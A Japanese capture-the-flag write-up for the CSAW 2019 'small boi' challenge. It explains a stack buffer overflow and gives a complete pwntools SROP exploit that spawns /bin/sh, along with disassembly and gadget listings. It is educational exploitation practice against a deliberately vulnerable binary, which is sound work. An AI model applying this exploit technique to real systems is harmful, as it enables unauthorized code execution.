---
tags: pwn
---

# CSAW CTF 2019 Quals - small boi

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

CTFのリポジトリ: https://github.com/osirislab/CSAW-CTF-2019-Quals

## Writeup

### Outline

自明なBOFがあるのでROPをしようと思ったがバイナリがコンパクトでまともなガジェットが無い。幸いにも任意システムコールを呼ぶことが出来るのでSROPでレジスタに入れたい値をpopしてから再度システムコールを呼ぶ事で`execve("/bin/sh", null, null)`を実行する

### checksec

```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

NX以外無効というここ最近のフルアーマーからすると信じられないレベルの貧弱さ

### Binary

非常に軽量なバイナリで多分元がC言語ではない(リポジトリあったので見たらインラインアセンブラだった)。Ghidraのデコンパイルはまともに働いてくれないのでradare2でディスアセンブル結果を覗く

まずはentry部分
```
[0x004001ad]> pdf
/ (fcn) entry0 29
|   entry0 ();
|           0x004001ad      55             push rbp
|           0x004001ae      4889e5         mov rbp, rsp
|           0x004001b1      b800000000     mov eax, 0
|           0x004001b6      e8d1ffffff     call fcn.0040018c
|           0x004001bb      4831f8         xor rax, rdi
|           0x004001be      48c7c03c0000.  mov rax, 0x3c               ; '<' ; 60
|           0x004001c5      0f05           syscall
|           0x004001c7      90             nop
|           0x004001c8      5d             pop rbp
\           0x004001c9      c3             ret
```

`fcn.0040018c`を呼んだ後にシステムコールを60番で呼び出している。これはexitのシステムコール番号である。

entry中で呼ばれている`fcn.0040018c`は次の通り

```
/ (fcn) fcn.0040018c 33
|   fcn.0040018c ();
|           ; var int local_20h @ rbp-0x20
|              ; CALL XREF from 0x004001b6 (entry0)
|           0x0040018c      55             push rbp
|           0x0040018d      4889e5         mov rbp, rsp
|           0x00400190      488d45e0       lea rax, qword [local_20h]
|           0x00400194      4889c6         mov rsi, rax
|           0x00400197      4831c0         xor rax, rax
|           0x0040019a      4831ff         xor rdi, rdi
|           0x0040019d      48c7c2000200.  mov rdx, 0x200              ; 512
|           0x004001a4      0f05           syscall
|           0x004001a6      b800000000     mov eax, 0
|           0x004001ab      5d             pop rbp
\           0x004001ac      c3             ret
```

システムコール番号を0で呼び出していることからreadが呼ばれていることがわかる。
他の引数を見ると

```
rdi: 0
rsi: rbp - 0x20
rdx: 0x200
```

であることから`read(0, buf, 0x200)`のような処理になっていることがわかる
`buf`のサイズは0x20で確保されているように見えることからここの処理にBOFが存在する。今回はカナリアも無いことからROPが出来そうである。

## gadget探し

システムコールが使えそうなので`execve("/bin/sh", 0, 0)`を呼びたい。今回はPIE無効なので`/bin/sh`がELF中にあればそのまま使えそうである。というわけでstringsコマンドをかけるとあったので使うことにする
あとは各種レジスタに値を入れれば良いのだが、バイナリが非常に小さい上に直接アセンブリを書いていそうなことから`pop rdi`のようなガジェットが存在しない。

```
$ rpg small_boi
Gadgets information
============================================================
0x00000000004001a7 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x0000000000400235 : add byte ptr [rax], al ; add byte ptr [rdi + rdi*8 - 1], dl ; jmp qword ptr [rcx]
0x0000000000400182 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; add eax, 0x58c35d90 ; ret
0x00000000004001a9 : add byte ptr [rax], al ; pop rbp ; ret
0x0000000000400183 : add byte ptr [rax], al ; syscall
0x0000000000400237 : add byte ptr [rdi + rdi*8 - 1], dl ; jmp qword ptr [rcx]
0x0000000000400184 : add byte ptr [rdi], cl ; add eax, 0x58c35d90 ; ret
0x00000000004001a0 : add byte ptr [rdx], al ; add byte ptr [rax], al ; syscall
0x0000000000400186 : add eax, 0x58c35d90 ; ret
0x00000000004001bd : clc ; mov rax, 0x3c ; syscall
0x000000000040016b : clc ; push -0x4f ; xchg eax, edi ; shr byte ptr [rdx + rcx*2 + 0x68], 0x96 ; ret 0x5462
0x00000000004001c1 : cmp al, 0 ; add byte ptr [rax], al ; syscall
0x000000000040019c : dec dword ptr [rax - 0x39] ; ret 0x200
0x000000000040023b : jmp qword ptr [rcx]
0x000000000040016d : mov cl, 0x97 ; shr byte ptr [rdx + rcx*2 + 0x68], 0x96 ; ret 0x5462
0x00000000004001a6 : mov eax, 0 ; pop rbp ; ret
0x00000000004001bf : mov eax, 0x3c ; syscall
0x0000000000400180 : mov eax, 0xf ; syscall
0x000000000040017e : mov ebp, esp ; mov eax, 0xf ; syscall
0x000000000040019e : mov edx, 0x200 ; syscall
0x00000000004001be : mov rax, 0x3c ; syscall
0x000000000040017d : mov rbp, rsp ; mov eax, 0xf ; syscall
0x000000000040019d : mov rdx, 0x200 ; syscall
0x0000000000400187 : nop ; pop rbp ; ret
0x000000000040018a : pop rax ; ret
0x0000000000400188 : pop rbp ; ret
0x000000000040016c : push -0x4f ; xchg eax, edi ; shr byte ptr [rdx + rcx*2 + 0x68], 0x96 ; ret 0x5462
0x000000000040017c : push rbp ; mov rbp, rsp ; mov eax, 0xf ; syscall
0x0000000000400189 : ret
0x000000000040019f : ret 0x200
0x0000000000400174 : ret 0x5462
0x000000000040016f : shr byte ptr [rdx + rcx*2 + 0x68], 0x96 ; ret 0x5462
0x0000000000400185 : syscall
0x000000000040016e : xchg eax, edi ; shr byte ptr [rdx + rcx*2 + 0x68], 0x96 ; ret 0x5462
0x0000000000400173 : xchg eax, esi ; ret 0x5462
0x00000000004001bc : xor eax, edi ; mov rax, 0x3c ; syscall
0x000000000040019b : xor edi, edi ; mov rdx, 0x200 ; syscall

Unique gadgets found: 37
```

(`rpg`は`ROPgadget.py --binary`のエイリアス)

但し`pop rax; ret`と`syscall`があるので引数を設定しないのならシステムコールは呼べそうである。そこでsigreturnシステムコールを呼ぶ

## SROP

sigreturnシステムコールというものがある。x64なら15番のシステムコールで発動する。詳しい説明は参考文献に投げるが、カーネル空間からユーザ空間に戻る際に、退避しておいたユーザ空間のレジスタの値を復元するために各レジスタに対して値をpopする処理が行われる。これは"全てのレジスタ"に対してpopが行われるためスタックを次のようにしておけば任意のシステムコールが呼べそうである。

```
(saved_rbp, any)
&(pop rax; ret)
0xf  // rt_sigretunのシステムコール番号
&syscall
values
...
```

popする順番も決まっているので上手くスタックを構成すれば任意システムコーツが呼べる。どの順番でpopされるかは長くなるので参考文献に投げるが今回はpwntoolsにある`SigreturnFrame`を利用した。これをデフォルトの値は0(cs/gs/fsだけ確か何らかの値が入っている)で他のレジスタの値を辞書かドット記法で指定出来る(詳しくはコードを見たほうが早い)。
というわけで次のようにレジスタの値を設定すればこのシステムコールが呼ばれた後に`execve("/bin/sh", null, null)`を呼ぶことが出来そうである

```
rdi: &("/bin/sh")
rsi: 0
rdx: 0
rax: 59  // execveのシステムコール番号
rip: &syscall
```

なお、今回は`mov eax, 0xf; syacall`のガジェットがあったのでraxに値をpopせずにこれをそのまま使った

## Code

```python
from pwn import p64, u64, ELF, process, remote, SigreturnFrame, context, constants


if __name__ == "__main__":
    elf = ELF("./small_boi")
    context.binary = elf

    binsh = next(elf.search(b"/bin/sh\x00"))
    gadgets = {
        "syscall": 0x400185,
        "pop_rax": 0x40018a,
        "sigreturn": 0x400180
    }

    s = process(elf.path)
    junk = b"a" * 0x28
    payload = junk
    payload += p64(gadgets["sigreturn"])

    frame = SigreturnFrame()
    frame["rax"] = 59
    frame["rdi"] = binsh
    frame["rsi"] = 0
    frame["rdx"] = 0
    frame["rip"] = gadgets["syscall"]

    payload += bytes(frame)

    s.send(payload)

    s.interactive()
```

## Flag

ローカルでシェル取っただけ

## 感想

TSGCTFでSROPが出たので習得するかと思ったので解きましたがこのコーナーのこの時期にやるにはちょっと簡単すぎたので応用できそうな問題を探したいです(TSGCTFのBeginner's PwnはFSA等他にやることが多すぎるので後回し)

元々WSLでやってたら何故か上手く行かなかった(公式のwriteupも他人のwriteupも全部効かなかった)のでVirtualBoxで試すついでに環境構築してこのコーナーサボってました
結果、仮想環境上のubuntu serverに対してVSCodeからSSHするのが楽だったので今度からこれでExploit開発します

## 参考文献

* [x64でSigreturn Oriented ProgrammingによるASLR+DEP+RELRO回避をやってみる - ももいろテクノロジー](http://inaz2.hatenablog.com/entry/2014/07/30/021123)